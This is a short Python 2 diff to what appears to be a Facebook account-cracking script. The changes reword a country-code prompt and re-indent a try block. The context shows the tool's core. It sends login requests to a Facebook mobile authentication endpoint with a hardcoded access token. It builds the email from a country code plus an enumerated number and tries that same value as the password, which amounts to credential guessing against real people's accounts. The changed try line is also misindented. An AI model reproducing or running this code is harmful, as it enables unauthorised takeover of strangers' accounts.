@@ -127,7 +127,7 @@ def menu():
 	action()
 	
 def action():	
-	bch = raw_input('\n  ENTER HERE COUNTRY CODE ')
+	bch = raw_input('\n  SELECT COUNTRY ')
 	if bch =='':
 		print '[!] Fill in correctly'
 		action()
@@ -196,7 +196,7 @@ def action():
 		global cpb,oks
 		user = arg
 		
-	try:
+	        try:
 			pass1 = user
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
